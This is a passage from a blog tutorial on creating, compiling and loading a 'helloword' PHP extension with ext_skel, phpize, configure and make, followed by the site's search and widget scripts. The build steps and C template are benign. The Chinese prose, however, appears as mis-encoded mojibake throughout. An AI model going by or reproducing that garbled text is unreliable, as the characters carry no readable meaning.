<p>è¿™é‡Œéœ€è¦æŒ‡å®šä¸€ä¸‹<code>--with-php-config</code>ï¼Œé€‰æ‹©è‡ªå·±çš„<code>php-config</code>ï¼Œå½“ç„¶å¦‚æœæœ¬åœ°çš„ç¯å¢ƒå˜é‡binå‘½ä»¤ä¸‹ç›´æ¥æœ‰<code>php-config</code>ä¹Ÿä¸ç”¨æŒ‡å®šäº†ï¼Œéšå</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±å¯ä»¥åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101759576.png" alt="image-20220210175900511"></p>
<p>å…¶ä¸­<code>helloworld.c</code>å³ä¸ºåˆ›å»ºçš„æ¨¡æ¿ä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ5.6ç‰ˆæœ¬çš„ç¼–è¯‘å®Œæˆåï¼Œä¸ç”Ÿæˆ.soæ¨¡å—æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬ç‰¹æ€§ï¼Ÿ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helloword extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_helloword.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void helloword_test1()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string helloword_test2( [ string $var ] )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">		<span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span></span><br><span class="line"><span class="function">	<span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;helloword support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_HELLOWORD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(helloword)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼š-1"   >
          <a href="#ğŸ”ºæ³¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š-1" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h2>
      <p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨php7.3ä»¥ä¸Šï¼Œ<code>ext_skel</code>è¿™ä¸ªshellå˜æˆäº†<code>ext_skel.php</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹æ¥åˆ›å»º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/73/bin/php ./ext_skel.php --ext helloword</span><br><span class="line">/www/server/php/73/bin/phpize</span><br><span class="line">./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config</span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-åŠ è½½æ¨¡å—"   >
          <a href="#3-åŠ è½½æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åŠ è½½æ¨¡å—" class="headerlink" title="3.åŠ è½½æ¨¡å—"></a>3.åŠ è½½æ¨¡å—</h2>
      
        <h3 id="æ–¹æ³•ä¸€ï¼š"   >
          <a href="#æ–¹æ³•ä¸€ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3>
      <p>ç›´æ¥<code>make install</code>ï¼Œç„¶ååœ¨å¯¹åº”çš„php.iniä¸­æ·»åŠ <code>extension=helloword.so</code></p>

        <h3 id="æ–¹æ³•äºŒï¼š"   >
          <a href="#æ–¹æ³•äºŒï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3>
      <p>å¤åˆ¶modulesä¸‹çš„helloworld.soæ¨¡å—åˆ°å¯¹åº”çš„phpæ‰©å±•ç›®å½•</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·ä¹Ÿå¾—åœ¨php.iniä¸­æ·»åŠ extension</p>
<p>ä¹‹åä½¿ç”¨æ¨¡æ¿ä¸­å‡½æ•°æµ‹è¯•å³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">helloword_test1();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å³å¯æˆåŠŸ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101910792.png"></p>
<p>è¿™ä¸ªphpæ‹“å±•æ¨¡å—å…¶å®è·Ÿlinuxå†…æ ¸æœ‰ç‚¹åƒ</p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">119</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">63</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">61</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>